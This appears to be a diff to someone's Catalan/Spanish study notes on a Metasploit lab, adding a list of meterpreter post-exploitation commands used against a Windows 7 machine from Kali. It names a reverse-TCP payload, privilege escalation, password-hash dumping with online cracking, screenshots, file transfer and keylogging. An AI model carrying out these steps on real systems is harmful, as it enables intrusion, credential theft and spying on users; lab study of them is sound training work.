@@ -12,3 +12,15 @@
 * i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
 
 Ja estem dins...
+
+* Comandaments 
+    * sysinfo
+    * pwd
+    * getuid
+    * migrate pid por si caso cierra el programa que me ha conectado
+    * getsystem
+    * hashdump -> crackstation
+    * screenshot
+    * upload de kali a win7
+    * download de W7 a Kali
+    * keyscan_start keyscan_dump
